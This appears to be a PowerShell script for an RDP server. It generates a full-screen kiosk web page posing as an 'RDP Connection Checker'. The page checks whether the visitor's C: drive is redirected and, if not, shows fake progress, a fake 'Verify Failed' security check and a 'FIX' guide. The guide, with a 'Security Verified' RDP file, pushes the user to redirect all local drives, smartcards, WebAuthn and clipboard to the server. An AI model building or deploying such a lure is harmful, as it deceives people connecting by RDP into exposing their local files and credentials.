$ErrorActionPreference= 'silentlycontinue'
$successMessage=@"
<br>
 <div id="successMessage" class="hidden bg-green-50 border border-green-200 text-green-700 px-4 py-3 rounded-lg mb-6">
            <div class="flex items-center">
                <div class="flex-shrink-0">
                    <i class="fas fa-check-circle text-green-500"></i>
                </div>
                <div class="ml-3">
                    <p class="font-medium">RDP Connection Successful!</p>
                    <p class="text-sm">Wait Moment For Loading</p>
                </div>
            </div>
        </div>

"@

$errorMessage=@"
<br>
<div id="errorMessage" class="hidden bg-red-50 border border-red-200 text-red-700 px-4 py-3 rounded-lg mb-6">
            <div class="flex items-center">
                <div class="flex-shrink-0">
                    <i class="fas fa-exclamation-circle text-red-500"></i>
                </div>
                <div class="ml-3">
                    <p class="font-medium">Connection Failed</p>
                    <p class="text-sm">RDP Connection Have Problem Use FIX.</p>
                </div>
            </div>
        </div>

"@
$success = @"
<div id="rdpCheck" class="bg-gray-50 rounded-lg p-4">
    <div class="flex justify-between items-center">
        <div>
            <p class="text-xs text-gray-500 mb-1">Security Check</p>
            <p class="font-medium text-gray-800" >Connection OK</p>
        </div>
        <div id="rdpStatus" class="bg-green-100 w-6 h-6 rounded-full flex items-center justify-center">
            <i class="fas fa-check text-green-500 text-xs"></i>
        </div>
    </div>
</div>
"@

$fails = @"
<div id="rdpCheck" class="bg-gray-50 rounded-lg p-4 mb-4">
    <div class="flex justify-between items-center">
        <div>
            <p class="text-xs text-gray-500 mb-1">Security Check</p>
            <p class="font-medium text-gray-800" id="seccheck">Checking...</p>
        </div>
        <div id="rdpStatus" class="w-6 h-6 rounded-full  bg-gray-200  flex items-center justify-center">
            <i class="fas fa-circle-notch fa-spin text-gray-500 text-xs" ></i>
        </div>
    </div>
</div>
"@

# Define the HTML content
$htmlContent = @"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>rdp Connection Checker</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        .pulse-animation {
            animation: pulse 1.5s infinite;
        }
        .connection-card {
            box-shadow: 0 10px 30px -5px rgba(0, 0, 0, 0.1);
            transition: all 0.3s ease;
        }
        .connection-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 15px 35px -5px rgba(0, 0, 0, 0.15);
        }
        .progress-bar {
            height: 4px;
            transition: width 0.5s ease;
        }
          .rdp-config {
            font-family: Consolas, Monaco, 'Courier New', monospace;
            white-space: pre;
            tab-size: 2;
        }
        .ip-display {
            font-family: 'Courier New', monospace;
            letter-spacing: 1px;
        }
    </style>
</head>
<body class="bg-gray-50 min-h-screen flex items-center justify-center p-4">
    <div class="max-w-md w-full">
        <div class="text-center mb-8">
            <h1 class="text-3xl font-bold text-gray-800 mb-2">RDP Connection Check</h1>
            <p class="text-gray-600">Verifying your client connection</p>
        </div>

        <div class="connection-card bg-white rounded-xl p-6 mb-6">
            <div class="flex items-center justify-between mb-4">
                <div class="flex items-center">
                    <div class="w-10 h-10 rounded-full bg-blue-100 flex items-center justify-center mr-3">
                        <i class="fas fa-shield-alt text-blue-500"></i>
                    </div>
                    <div>
                        <h3 class="font-semibold text-gray-800">RDP Connection</h3>
                        <p class="text-sm text-gray-500">Checking security protocol</p>
                    </div>
                </div>
                <div id="rdpStatusIcon" class="w-8 h-8 rounded-full flex items-center justify-center">
                    <i class="fas fa-circle-notch fa-spin text-blue-500"></i>
                </div>
            </div>

            <div class="mb-4">
                <div class="flex justify-between text-sm text-gray-600 mb-1">
                    <span>Connection progress</span>
                    <span id="progressText">0%</span>
                </div>
                <div class="w-full bg-gray-200 rounded-full h-1.5">
                    <div id="progressBar" class="progress-bar bg-blue-500 rounded-full h-1.5" style="width: 0%"></div>
                </div>
            </div>

            <div class="bg-gray-50 rounded-lg p-4 mb-4">
                <div class="flex justify-between items-center">
                    <div>
                        <p class="text-xs text-gray-500 mb-1">Your current IP</p>
                        <p id="ipAddress" class="ip-display font-mono text-gray-800">Checking...</p>
                    </div>
                    <div id="ipStatus" class="w-6 h-6 rounded-full bg-gray-200 flex items-center justify-center">
                        <i class="fas fa-circle-notch fa-spin text-gray-500 text-xs"></i>
                    </div>
                </div>
            </div>

"@

$tsClientRoot = "\\tsclient\c"
$check=Test-Path $tsClientRoot
$rdpConnections = Get-NetTCPConnection -LocalPort 3389 | Where-Object { $_.State -eq 'Established' }| select -ExpandProperty RemoteAddress
if ($check) {
    $htmlContent += $success
    $htmlContent+=$successMessage
} else {
    $htmlContent += $fails
    $htmlContent+=$errorMessage

}

$htmlContent += @'

       

        
        <button id="checkAgainBtn" class="hidden w-full bg-blue-500 hover:bg-blue-600 text-white font-medium py-2 px-4 rounded-lg transition duration-200">
            FIX!
        </button>
    </div>
  <!-- Modal -->
        <div id="setupModal" class="fixed inset-0 bg-black bg-opacity-70 z-50 hidden overflow-y-auto">
            <div class="flex items-center justify-center min-h-screen p-4">
                <div class="bg-white rounded-lg shadow-xl w-full max-w-4xl max-h-[90vh] flex flex-col">
                    <!-- Modal Header -->
                    <div class="bg-blue-600 text-white px-6 py-4 rounded-t-lg flex justify-between items-center">
                        <h2 class="text-xl font-semibold">Drive Redirection Setup</h2>
                        <button id="closeModal" class="text-white hover:text-gray-200 text-2xl">
                            &times;
                        </button>
                    </div>
                    
                    <!-- Tabs -->
                    <div class="border-b border-gray-200">
                        <div class="flex">
                            <button data-tab="guide" class="tab-btn active px-6 py-3 font-medium text-blue-600 border-b-2 border-blue-600">
                                <i class="fas fa-list-ol mr-2"></i>Step-by-Step Guide
                            </button>
                            <button data-tab="download" class="tab-btn px-6 py-3 font-medium text-gray-500 hover:text-blue-600">
                                <i class="fas fa-download mr-2"></i>Download RDP File
                            </button>
                        </div>
                    </div>
                    
                    <!-- Tab Content -->
                    <div class="flex-1 overflow-y-auto">
                        <!-- Guide Tab -->
                        <div id="guide" class="tab-content p-6 active">
                            <!-- Step 1 -->
                            <div class="bg-blue-50 border-l-4 border-blue-600 p-4 mb-4 rounded">
                                <div class="flex items-start">
                                    <div class="bg-blue-600 text-white rounded-full w-8 h-8 flex items-center justify-center mr-3 flex-shrink-0">1</div>
                                    <div>
                                        <h3 class="font-semibold text-lg mb-1">Open Remote Desktop Connection</h3>
                                        <p class="text-gray-700 mb-2">Press <kbd class="bg-gray-200 px-2 py-1 rounded">Win</kbd> + <kbd class="bg-gray-200 px-2 py-1 rounded">R</kbd>, type <code class="bg-gray-100 px-1 rounded">mstsc</code> and press Enter.</p>
                                        <img src="res/step1.png" alt="Run dialog with mstsc" class="w-full max-w-md border border-gray-200 rounded mt-2 shadow-sm">
                                    </div>
                                </div>
                            </div>
                            
                            <!-- Step 2 -->
                            <div class="bg-blue-50 border-l-4 border-blue-600 p-4 mb-4 rounded">
                                <div class="flex items-start">
                                    <div class="bg-blue-600 text-white rounded-full w-8 h-8 flex items-center justify-center mr-3 flex-shrink-0">2</div>
                                    <div>
                                        <h3 class="font-semibold text-lg mb-1">Access Advanced Options</h3>
                                        <p class="text-gray-700 mb-2">Click "Show Options" to expand configuration settings.</p>
                                        <img src="res/step2.png" alt="Show Options button" class="w-full max-w-md border border-gray-200 rounded mt-2 shadow-sm">
                                    </div>
                                </div>
                            </div>
                            
                            <!-- Step 3 -->
                            <div class="bg-blue-50 border-l-4 border-blue-600 p-4 mb-4 rounded">
                                <div class="flex items-start">
                                    <div class="bg-blue-600 text-white rounded-full w-8 h-8 flex items-center justify-center mr-3 flex-shrink-0">3</div>
                                    <div>
                                        <h3 class="font-semibold text-lg mb-1">Navigate to Local Resources</h3>
                                        <p class="text-gray-700 mb-2">Select the "Local Resources" tab at the top of the window.</p>
                                        <img src="res/step3.png" alt="Local Resources tab" class="w-full max-w-md border border-gray-200 rounded mt-2 shadow-sm">
                                    </div>
                                </div>
                            </div>
                            
                            <!-- Step 4 -->
                            <div class="bg-blue-50 border-l-4 border-blue-600 p-4 mb-4 rounded">
                                <div class="flex items-start">
                                    <div class="bg-blue-600 text-white rounded-full w-8 h-8 flex items-center justify-center mr-3 flex-shrink-0">4</div>
                                    <div>
                                        <h3 class="font-semibold text-lg mb-1">Configure Drive Redirection</h3>
                                        <p class="text-gray-700 mb-2">Click "More..." under "Local devices and resources" section.</p>
                                        <img src="res/step4.png" alt="More button" class="w-full max-w-md border border-gray-200 rounded mt-2 shadow-sm">
                                    </div>
                                </div>
                            </div>
                            
                            <!-- Step 5 -->
                            <div class="bg-blue-50 border-l-4 border-blue-600 p-4 mb-4 rounded">
                                <div class="flex items-start">
                                    <div class="bg-blue-600 text-white rounded-full w-8 h-8 flex items-center justify-center mr-3 flex-shrink-0">5</div>
                                    <div>
                                        <h3 class="font-semibold text-lg mb-1">Select Your Drives</h3>
                                        <p class="text-gray-700 mb-2">Check the boxes for drives you want to access remotely, then click OK.</p>
                                        <img src="res/step5.png" alt="Drive selection" class="w-full max-w-md border border-gray-200 rounded mt-2 shadow-sm">
                                    </div>
                                </div>
                            </div>
                            
                            <!-- Step 6 -->
                            <div class="bg-blue-50 border-l-4 border-blue-600 p-4 mb-6 rounded">
                                <div class="flex items-start">
                                    <div class="bg-blue-600 text-white rounded-full w-8 h-8 flex items-center justify-center mr-3 flex-shrink-0">6</div>
                                    <div>
                                        <h3 class="font-semibold text-lg mb-1">Save and Connect</h3>
                                        <p class="text-gray-700 mb-2">Click "Connect" to start your session with drive access enabled.</p>
                                        <p class="text-gray-700"><strong>Note:</strong> You may need to enter your credentials again.</p>
                                    </div>
                                </div>
                            </div>
                            
                     
                        </div>
                        
                        <!-- Download Tab -->
                        <div id="download" class="tab-content p-6 hidden">
                            <div class="border-2 border-dashed border-gray-300 bg-blue-50 rounded-lg p-8 text-center mb-6">
                                <div class="inline-flex items-center bg-green-100 text-green-800 px-4 py-2 rounded-full mb-4">
                                    <i class="fas fa-shield-alt mr-2"></i>
                                    Security Verified
                                </div>
                                <h3 class="text-xl font-semibold mb-2">Pre-Configured Secure RDP File</h3>
                                <p class="text-gray-700 mb-4">Download our pre-configured RDP file with secure  settings.</p>
                                <button id="downloadBtn" class="bg-blue-600 hover:bg-blue-700 text-white px-6 py-3 rounded-md shadow transition-all">
                                    <i class="fas fa-download mr-2"></i>Download Secure RDP File
                                </button>
                                <p class="text-sm text-gray-500 mt-2">File will be saved as <code class="bg-gray-100 px-1 rounded">SecureConnection.rdp</code></p>
                            </div>
                            
                         
                            
                            <!-- Manual Configuration Section -->
                            <div class="bg-blue-50 border-l-4 border-blue-600 p-4 mb-4 rounded">
                                <h3 class="font-semibold text-lg mb-3">Manual Configuration Option</h3>
                                <p class="text-gray-700 mb-4">Alternatively, copy this configuration to create your RDP file manually:</p>
                                
                                <div class="relative mb-4">
                                    <button onclick="copyRdpConfig()" class="absolute right-2 top-2 bg-blue-600 hover:bg-blue-700 text-white px-3 py-1 rounded text-sm">
                                        <i class="fas fa-copy mr-1"></i>Copy
                                    </button>
                                    <textarea id="rdpConfig" class="rdp-config w-full h-64 p-4 border border-gray-300 rounded bg-gray-100 text-gray-800" readonly>
screen mode id:i:2
use multimon:i:0
desktopwidth:i:1920
desktopheight:i:1080
session bpp:i:32
winposstr:s:0,1,865,135,1665,735
compression:i:1
keyboardhook:i:2
audiocapturemode:i:0
videoplaybackmode:i:1
connection type:i:7
networkautodetect:i:1
bandwidthautodetect:i:1
displayconnectionbar:i:1
enableworkspacereconnect:i:0
remoteappmousemoveinject:i:1
disable wallpaper:i:0
allow font smoothing:i:0
allow desktop composition:i:0
disable full window drag:i:1
disable menu anims:i:1
disable themes:i:0
disable cursor setting:i:0
bitmapcachepersistenable:i:1
full address:s:192.168.1.11
audiomode:i:0
redirectprinters:i:1
redirectlocation:i:0
redirectcomports:i:0
redirectsmartcards:i:1
redirectwebauthn:i:1
redirectclipboard:i:1
redirectposdevices:i:0
autoreconnection enabled:i:1
authentication level:i:2
prompt for credentials:i:0
negotiate security layer:i:1
remoteapplicationmode:i:0
alternate shell:s:
shell working directory:s:
gatewayhostname:s:
gatewayusagemethod:i:4
gatewaycredentialssource:i:4
gatewayprofileusagemethod:i:0
promptcredentialonce:i:0
gatewaybrokeringtype:i:0
use redirection server name:i:0
rdgiskdcproxy:i:0
kdcproxyname:s:
enablerdsaadauth:i:0
drivestoredirect:s:*</textarea>
                                </div>
                                
                                <h4 class="font-semibold mb-2">Instructions:</h4>
                                <ol class="list-decimal pl-5 text-gray-700 space-y-2">
                                    <li>Copy the configuration text above</li>
                                    <li>Paste into a new text file in Notepad</li>
                                    <li>Replace <code class="bg-gray-200 px-1 rounded">192.168.1.11</code> with your server address</li>
                                    <li>Save with <code class="bg-gray-200 px-1 rounded">.rdp</code> extension</li>
                                    <li>Double-click to connect</li>
                                </ol>
                            </div>
                            
                         
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Copy Notification -->
    <div id="copyNotification" class="fixed bottom-4 right-4 bg-green-500 text-white px-4 py-3 rounded shadow-lg hidden flex items-center">
        <i class="fas fa-check-circle mr-2"></i> Configuration copied!
    </div>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Simulate connection check
            simulateConnectionCheck();
            
        
        });

        function simulateConnectionCheck() {
            const progressBar = document.getElementById('progressBar');
            const progressText = document.getElementById('progressText');
            const ipAddress = document.getElementById('ipAddress');
            const ipStatus = document.getElementById('ipStatus');
            const rdpStatusIcon = document.getElementById('rdpStatusIcon');
            const rdpStatus = document.getElementById('rdpStatus');
            const successMessage = document.getElementById('successMessage');
            const errorMessage = document.getElementById('errorMessage');
            const checkAgainBtn = document.getElementById('checkAgainBtn');
            const sucstat = document.getElementById('sucstat');
            let progress = 0;
            const interval = setInterval(() => {
                progress += Math.floor(Math.random() * 10) + 5;
                if (progress > 100) progress = 100;
                
                progressBar.style.width = `${progress}%`;
                progressText.textContent = `${progress}%`;
                
                // Update at different stages
                if (progress >= 30) {
                    // Simulate IP check
                    ipAddress.textContent = "192.168.1." + Math.floor(Math.random() * 255);
'@
                    
    $htmlContent+="ipAddress.textContent = '$rdpConnections'"
 $htmlContent += @'

                    ipStatus.innerHTML = '<i class="fas fa-check text-green-500 text-xs"></i>';
                    ipStatus.className = 'w-6 h-6 rounded-full bg-green-100 flex items-center justify-center';
                }
                
               
                
                if (progress >= 100) {
                    clearInterval(interval);
                   if(document.getElementById('rdpStatus')){
            if(document.getElementById('seccheck')){

            document.getElementById('seccheck').textContent = 'Verify Failed';
            document.getElementById('rdpStatus').innerHTML = '<i class="fas fa-times-circle text-red-500"></i>';
            }
                   
                   }
'@
if ($check) {
    $htmlContent += @'

 rdpStatusIcon.innerHTML = '<i class="fas fa-check-circle text-green-500"></i>';
                        successMessage.classList.remove('hidden');
'@

} else {
     $htmlContent += @'

   rdpStatusIcon.innerHTML = '<i class="fas fa-times-circle text-red-500"></i>';
                        errorMessage.classList.remove('hidden');
                    checkAgainBtn.classList.remove('hidden');

'@

}
$htmlContent += @'
                 
                       
                       
                      
                    
                }
            }, 500);
        }

     // Modal functionality
            const modal = document.getElementById('setupModal');
            const closeModal = document.getElementById('closeModal');
            
            // Open modal when FIX button is clicked
            if (checkAgainBtn) {
                checkAgainBtn.addEventListener('click', () => {
                    modal.classList.remove('hidden');
                    document.body.style.overflow = 'hidden';
                });
            }
            
            // Close modal when X is clicked
            if (closeModal) {
                closeModal.addEventListener('click', () => {
                    modal.classList.add('hidden');
                    document.body.style.overflow = 'auto';
                });
            }
            
            // Close when clicking outside modal
            window.addEventListener('click', (e) => {
                if (e.target === modal) {
                    modal.classList.add('hidden');
                    document.body.style.overflow = 'auto';
                }
            });
            
            // Close with Escape key
            document.addEventListener('keydown', (e) => {
                if (e.key === 'Escape' && !modal.classList.contains('hidden')) {
                    modal.classList.add('hidden');
                    document.body.style.overflow = 'auto';
                }
            });

            // Tab functionality
            const tabBtns = document.querySelectorAll('.tab-btn');
            const tabContents = document.querySelectorAll('.tab-content');
            
            tabBtns.forEach(btn => {
                btn.addEventListener('click', () => {
                    const tabId = btn.getAttribute('data-tab');
                    
                    // Update active tab button
                    tabBtns.forEach(b => {
                        b.classList.remove('active', 'text-blue-600', 'border-blue-600');
                        b.classList.add('text-gray-500', 'hover:text-blue-600');
                    });
                    btn.classList.add('active', 'text-blue-600', 'border-blue-600');
                    btn.classList.remove('text-gray-500', 'hover:text-blue-600');
                    
                    // Show corresponding content
                    tabContents.forEach(content => {
                        content.classList.add('hidden');
                        content.classList.remove('active');
                        if (content.id === tabId) {
                            content.classList.remove('hidden');
                            content.classList.add('active');
                        }
                    });
                });
            });
            
            // Download RDP file
            document.getElementById('downloadBtn').addEventListener('click', function() {
                alert("Download Link is : https://SecureConnection.rdp")
                
            });
 function copyRdpConfig() {
            const rdpConfig = document.getElementById('rdpConfig');
            rdpConfig.select();
            document.execCommand('copy');
            
            // Show notification
            const notification = document.getElementById('copyNotification');
            notification.classList.remove('hidden');
            setTimeout(() => {
                notification.classList.add('hidden');
            }, 3000);
        }

        function resetUI() {
            document.getElementById('progressBar').style.width = '0%';
            document.getElementById('progressText').textContent = '0%';
            document.getElementById('ipAddress').textContent = 'Checking...';
            document.getElementById('ipStatus').innerHTML = '<i class="fas fa-circle-notch fa-spin text-gray-500 text-xs"></i>';
            document.getElementById('ipStatus').className = 'w-6 h-6 rounded-full bg-gray-200 flex items-center justify-center';
            document.getElementById('rdpStatusIcon').innerHTML = '<i class="fas fa-circle-notch fa-spin text-blue-500"></i>';
            document.getElementById('rdpStatus').innerHTML = '<i class="fas fa-circle-notch fa-spin text-gray-500 text-xs"></i>';
            document.getElementById('rdpCheck').className = 'bg-gray-50 rounded-lg p-4';
            document.getElementById('successMessage').classList.add('hidden');
            document.getElementById('errorMessage').classList.add('hidden');
            document.getElementById('checkAgainBtn').classList.add('hidden');
                    
        }

        
    </script>
</body>
</html>
'@

# Define the path where the HTML file will be saved
$filePath = "c:/ui/check.html"
# Save the HTML content to the file
$htmlContent | Out-File -FilePath $filePath -Encoding UTF8

# Open the HTML file in the default browser
Start-Process "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" -ArgumentList "--kiosk", "--edge-kiosk-type=fullscreen", "file:///C:/ui/check.html", "--disable-features=Translate,msWebOOUI,msPdfOOUI"
